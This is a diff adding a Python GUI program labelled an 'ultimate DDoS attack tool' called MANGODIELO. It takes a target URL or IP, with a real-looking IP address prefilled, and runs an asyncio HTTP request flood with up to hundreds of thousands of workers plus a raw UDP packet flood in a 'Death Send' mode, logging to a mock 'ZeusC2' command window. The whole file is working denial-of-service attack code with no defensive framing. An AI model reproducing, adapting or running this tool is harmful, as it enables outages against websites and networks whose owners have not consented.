@@ -1,0 +1,263 @@
+#!/usr/bin/env python3
+"""
+MANGODIELO - ULTIMATE DDOS ATTACK TOOL
+FINAL VERSION + UDP FLOOD
+"""
+
+import tkinter as tk
+from tkinter import messagebox
+import threading
+import asyncio
+import aiohttp
+import socket
+import random
+import time
+
+# ==================== COLORS ====================
+BG_COLOR = "#0a0a0a"
+GREEN = "#00ff41"
+CYAN = "#00ffff"
+RED = "#ff0044"
+WHITE = "#ffffff"
+
+# ==================== BIG ASCII ART ====================
+ASCII_ART = """
+         ███             ███             ███             ███             ███             ███          
+       ███░            ███░            ███░            ███░            ███░            ███░           
+     ███░            ███░            ███░            ███░            ███░            ███░            █
+   ███░            ███░            ███░            ███░            ███░            ███░            ███
+ ███░            ███░            ███░            ███░            ███░            ███░            ███░ 
+██░            ███░            ███░            ███░            ███░            ███░            ███░   
+░            ███░            ███░            ███░            ███░            ███░            ███░     
+            ░░░             ░░░             ░░░             ░░░             ░░░             ░░░       
+     █▓█████▄ ▓█████▄██▒█████    ███████    ▄▄▄     ▄▄▄█████▓▄▄▄█████▓█▄▄▄       ▄████▄█  ██ ▄█▀     █
+   ███▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██ ███▒    ▒████▄  █▓█░██▒ ▓▒▓  ██▒█▓▒▒████▄    ▒██▀ ▀█   ██▄█▒    ███
+ ███░ ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒██  ▀█▄█▒ ▓██░ ▒░▒ ▓██░█▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░  ███░ 
+██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄███▒▓▓▄ ▄██▒▓██ █▄███░   
+░     ░▒████▓█░▒████▓ ░ ████▓▒░▒██████▒▒    ▓███░▓██▒ ▒██▒ ░ ██▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒██▄░     
+       ▒▒▓ █▒█░▒▒▓  ▒ ░ ▒░▒░▒░░▒ ▒▓▒ ▒ ░   █▒▒░  ▓▒█░ ▒ ░░ ███░▒ ░░    ▒▒  █▓▒█░░ ░▒ ▒  ░▒ ▒▒█▓▒      
+       ░ ▒██▒  ░ ▒  ▒   ░█▒█▒░ ░ ░▒  ░ ░ ███░▒   ▒▒ ░   ░███░    ░      ▒███▒▒ ░  ░  ▒   ░█░▒ ▒░      
+       ░░░░ ░  ░ ░  ░ ░ ░░░ ▒  ░  ░  ░  ░░░  ░   ▒    ░ ░░░    ░        ░░░ ▒   ░       ░░░░░ ░       
+ ███     ░       ░██      ░ ░    ███ ░           ░██░            ███        ░  ░░█░█     ░  ░    ███  
+██░    ░       ░██░            ███░            ███░            ███░            █░█░            ███░   
+░      ███▄ ▄███▓ ▄▄▄       ███▄░   █   ▄██████▒█████  ▓█████▄████▓▓█████  ██▓██░  ▒█████    ███░     
+      ▓██▒▀█▀ ██▒▒████▄    ███░▀█   █  ██▒ ▀█▒▒██▒  ██▒▒██▀ ██▌▓██▒▓█   ▀ ▓██▒░   ▒██▒  ██▒███░       
+      ▓█████░▓██░▒██  ▀█▄██▓██  ▀█ ██▒▒██░▄▄▄░▒██░  ██▒░██   █▌▒██▒▒███  █▒██░    ▒██░  ██▒█░         
+      ▒███░  ▒██ ░██▄▄▄▄██░▓██▒  ▐▌██▒░▓█  ██▓▒██   ██░░▓█▄   ▌░██░▒▓█ █▄█▒██░    ▒██   ██░           
+     █▒██▒   ░██▒ ▓█ ██▓██▒▒██░   ▓██░░▒▓███▀▒░ ████▓▒░░▒████▓ ░██░░▒████▒░██████▒░ ████▓▒░          █
+    ░░░ ▒░   ░  ░ ▒▒░░░▓▒█░░ ▒░   ▒ ▒░░░▒   ▒ ░ ▒░▒░▒░░ ▒▒▓  ▒ ░▓  ░░░▒░ ░░ ▒░▓  ░░ ▒░▒░▒░          ░░
+      ░  ░   ███░  ▒   ▒▒ ░░ ░░█  ░ ▒░  ░   ░███░ ▒ ▒░  ░ ▒  ▒██▒ ░ ░ ░  ░░ ░█▒█ ░  ░ ▒ ▒░   ███      
+      ░    ██░░    ░   ▒   ███░   ░ ░ ░ ░  █░█░ ░ ░ ▒   ░ ░██░░ ▒ ░   ░    █░█░   ░ ░ ░ ▒  ███░       
+         ███░░         ░ █░█░       ░    ███░     ░ ░    █░█░   ░     ░  ░██░ ░  ░    ░ ░███░         
+       ███░            ███░            ███░            █░█░            ███░            ███░           
+     ███░            ███░            ███░            ███░            ███░            ███░            █
+   ███░            ███░            ███░            ███░            ███░            ███░            ███
+ ███░            ███░            ███░            ███░            ███░            ███░            ███░ 
+░░░             ░░░             ░░░             ░░░             ░░░             ░░░             ░░░   
+"""
+
+class AttackGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("MANGODIELO - ULTIMATE")
+        self.root.geometry("980x860")
+        self.root.configure(bg=BG_COLOR)
+        self.root.resizable(False, False)
+
+        self.attack_running = False
+        self.create_interface()
+
+    def create_interface(self):
+        main = tk.Frame(self.root, bg=BG_COLOR)
+        main.pack(fill=tk.BOTH, expand=True, padx=25, pady=15)
+
+        tk.Label(main, text=ASCII_ART, font=("Consolas", 6), fg=GREEN, bg=BG_COLOR, justify="left").pack(pady=5)
+        tk.Label(main, text="ATTACK SENT", font=("Consolas", 24, "bold"), fg=GREEN, bg=BG_COLOR).pack(pady=10)
+
+        self.status_label = tk.Label(main, text="✓ Ready", font=("Consolas", 12), fg=CYAN, bg=BG_COLOR)
+        self.status_label.pack(pady=5)
+
+        # Attack Modes
+        mode_frame = tk.LabelFrame(main, text="ATTACK MODE", fg=GREEN, bg=BG_COLOR, font=("Consolas", 11, "bold"))
+        mode_frame.pack(pady=15, fill=tk.X, padx=30)
+
+        self.full_var = tk.BooleanVar()
+        self.mid_var = tk.BooleanVar()
+        self.low_var = tk.BooleanVar()
+        self.death_var = tk.BooleanVar()
+
+        tk.Checkbutton(mode_frame, text="Full Attack  (Maximum Power)", variable=self.full_var, fg=GREEN, bg=BG_COLOR, selectcolor="#003300", font=("Consolas", 10)).pack(anchor="w", padx=30, pady=4)
+        tk.Checkbutton(mode_frame, text="Mid Attack   (Balanced)", variable=self.mid_var, fg=GREEN, bg=BG_COLOR, selectcolor="#003300", font=("Consolas", 10)).pack(anchor="w", padx=30, pady=4)
+        tk.Checkbutton(mode_frame, text="Low Attack   (Stealth)", variable=self.low_var, fg=GREEN, bg=BG_COLOR, selectcolor="#003300", font=("Consolas", 10)).pack(anchor="w", padx=30, pady=4)
+        tk.Checkbutton(mode_frame, text="Death Send   (EXTREME - No limit)", variable=self.death_var, fg=RED, bg=BG_COLOR, selectcolor="#440000", font=("Consolas", 10, "bold")).pack(anchor="w", padx=30, pady=6)
+
+        # Targets
+        tk.Label(main, text="URL Target =", fg=GREEN, bg=BG_COLOR, font=("Consolas", 11)).pack(anchor="w", padx=40)
+        self.url_entry = tk.Entry(main, font=("Consolas", 11), bg="#111111", fg=WHITE, width=70)
+        self.url_entry.pack(pady=5, padx=40)
+        self.url_entry.insert(0, "http://example.com")
+
+        tk.Label(main, text="IP Target  =", fg=GREEN, bg=BG_COLOR, font=("Consolas", 11)).pack(anchor="w", padx=40)
+        self.ip_entry = tk.Entry(main, font=("Consolas", 11), bg="#111111", fg=WHITE, width=70)
+        self.ip_entry.pack(pady=5, padx=40)
+        self.ip_entry.insert(0, "135.125.240.206")
+
+        # Settings
+        settings_frame = tk.Frame(main, bg=BG_COLOR)
+        settings_frame.pack(pady=15)
+
+        tk.Label(settings_frame, text="Duration (seconds):", fg=GREEN, bg=BG_COLOR, font=("Consolas", 11)).pack(side=tk.LEFT, padx=20)
+        self.duration_entry = tk.Entry(settings_frame, width=12, font=("Consolas", 11), bg="#111111", fg=WHITE)
+        self.duration_entry.pack(side=tk.LEFT, padx=5)
+        self.duration_entry.insert(0, "30")
+
+        tk.Label(settings_frame, text="   Workers:", fg=GREEN, bg=BG_COLOR, font=("Consolas", 11)).pack(side=tk.LEFT, padx=20)
+        self.workers_entry = tk.Entry(settings_frame, width=18, font=("Consolas", 11), bg="#111111", fg=WHITE)
+        self.workers_entry.pack(side=tk.LEFT, padx=5)
+        self.workers_entry.insert(0, "200000")
+
+        # START BUTTON
+        self.start_btn = tk.Button(main, text="START ATTACK", font=("Consolas", 16, "bold"),
+                                  bg="#003300", fg=GREEN, width=25, height=2,
+                                  command=self.start_attack)
+        self.start_btn.pack(pady=30)
+
+        # Log Area
+        self.log_area = tk.Text(main, height=10, bg="#050505", fg="#00dd00", font=("Consolas", 9))
+        self.log_area.pack(fill=tk.BOTH, expand=True, padx=40, pady=10)
+
+    def log(self, text):
+        ts = time.strftime("%H:%M:%S")
+        self.log_area.insert(tk.END, f"[{ts}] {text}\n")
+        self.log_area.see(tk.END)
+
+    def start_attack(self):
+        if self.attack_running:
+            messagebox.showinfo("Info", "Attack is already running!")
+            return
+
+        target = self.url_entry.get().strip() or self.ip_entry.get().strip()
+        if not target:
+            messagebox.showwarning("Warning", "Voer een URL of IP target in!")
+            return
+
+        try:
+            duration = int(self.duration_entry.get())
+            workers = int(self.workers_entry.get())
+        except:
+            duration = 30
+            workers = 100000
+
+        if self.death_var.get():
+            mode = "DEATH SEND"
+        elif self.full_var.get():
+            mode = "FULL"
+        elif self.mid_var.get():
+            mode = "MID"
+        elif self.low_var.get():
+            mode = "LOW"
+        else:
+            mode = "CUSTOM"
+
+        self.attack_running = True
+        self.start_btn.config(state=tk.DISABLED, text="ATTACK RUNNING...")
+
+        self.log(f"Starting {mode} attack on {target} | Duration: {duration}s | Workers: {workers:,}")
+
+        self.open_command_window(target, duration, workers, mode)
+
+    def open_command_window(self, target, duration, workers, mode):
+        cmd_win = tk.Toplevel(self.root)
+        cmd_win.title("Command@ZeusC2")
+        cmd_win.geometry("780x520")
+        cmd_win.configure(bg=BG_COLOR)
+
+        tk.Label(cmd_win, text="[Command@ZeusC2] >", font=("Consolas", 11), fg=CYAN, bg=BG_COLOR).pack(anchor="w", padx=20, pady=10)
+
+        self.cmd_log = tk.Text(cmd_win, bg="#000000", fg=GREEN, font=("Consolas", 10))
+        self.cmd_log.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+
+        def cmd_log(msg):
+            ts = time.strftime("%H:%M:%S")
+            self.cmd_log.insert(tk.END, f"[{ts}] {msg}\n")
+            self.cmd_log.see(tk.END)
+
+        cmd_log(f"Target: {target}")
+        cmd_log(f"Mode: {mode} | Workers: {workers:,}")
+        cmd_log("Initializing threads...")
+
+        threading.Thread(target=self.run_attack, args=(target, duration, workers, mode, cmd_log), daemon=True).start()
+
+    def run_attack(self, target, duration, workers, mode, log_func):
+        try:
+            if mode == "DEATH SEND" or self.death_var.get():
+                # Run both HTTP + UDP in Death Send mode
+                threading.Thread(target=self.udp_flood, args=(target, duration, log_func), daemon=True).start()
+            asyncio.run(self.perform_http_attack(target, duration, workers, mode, log_func))
+        except Exception as e:
+            log_func(f"Error: {e}")
+        finally:
+            self.root.after(0, self.attack_finished)
+
+    async def perform_http_attack(self, target, duration, workers, mode, log_func):
+        connector = aiohttp.TCPConnector(limit=0, ssl=False)
+        timeout = aiohttp.ClientTimeout(total=20)
+
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            end_time = time.time() + duration
+            count = 0
+
+            while time.time() < end_time and self.attack_running:
+                tasks = []
+                current_workers = workers if self.death_var.get() else min(workers, 800)
+
+                for _ in range(current_workers):
+                    tasks.append(self.send_http_request(session, target))
+                    count += 1
+                    if count % 5000 == 0:
+                        log_func(f"HTTP Requests sent: {count:,}")
+
+                await asyncio.gather(*tasks, return_exceptions=True)
+                delay = 0.001 if self.death_var.get() else 0.02
+                await asyncio.sleep(delay)
+
+        log_func("HTTP Attack completed.")
+
+    async def send_http_request(self, session, target):
+        try:
+            async with session.get(f"http://{target}", allow_redirects=False) as resp:
+                await resp.read()
+        except:
+            pass
+
+    def udp_flood(self, target, duration, log_func):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536 * 8)
+            packet = random.randbytes(4096)
+            end_time = time.time() + duration
+            count = 0
+
+            while time.time() < end_time and self.attack_running:
+                try:
+                    sock.sendto(packet, (target, 80))
+                    count += 1
+                    if count % 10000 == 0:
+                        log_func(f"UDP Packets sent: {count:,}")
+                except:
+                    pass
+                time.sleep(0.0001)   # Zeer snel bij UDP
+        except Exception as e:
+            log_func(f"UDP Error: {e}")
+
+    def attack_finished(self):
+        self.attack_running = False
+        self.start_btn.config(state=tk.NORMAL, text="START ATTACK")
+        self.status_label.config(text="✓ Operation completed successfully", fg=CYAN)
+        self.log("All attacks finished.")
+
+if __name__ == "__main__":
+    print("MANGODIELO ULTIMATE starting...\n")
+    root = tk.Tk()
+    app = AttackGUI(root)
+    root.mainloop()
